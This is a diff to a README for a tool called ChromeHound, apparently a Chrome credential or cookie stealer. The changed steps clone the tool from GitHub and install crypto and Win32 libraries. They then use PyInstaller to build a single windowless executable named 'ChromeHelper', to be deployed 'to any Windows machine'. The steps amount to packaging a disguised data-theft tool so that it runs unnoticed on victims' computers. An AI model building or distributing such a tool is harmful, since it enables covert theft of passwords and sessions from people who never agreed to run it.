@@ -30,10 +30,12 @@ pip install pycryptodomex pypiwin32 requests
 ## Build standalone EXE (no Python needed on target)
 
 ```
-cd downloads
+cd Downloads
+git clone https://github.com/pal402134-gif/ChromeHound.git
+cd ChromeHound
 pip install pycryptodomex pypiwin32 requests
 pip install pyinstaller
-pyinstaller --onefile --noconsole --name chromehound.py
+python -m PyInstaller --onefile --noconsole --name ChromeHelper chromehound.py
 ```
 
 Output: `dist/ChromeHelper.exe` — single file, ~10 MB. Deploy to any Windows machine.
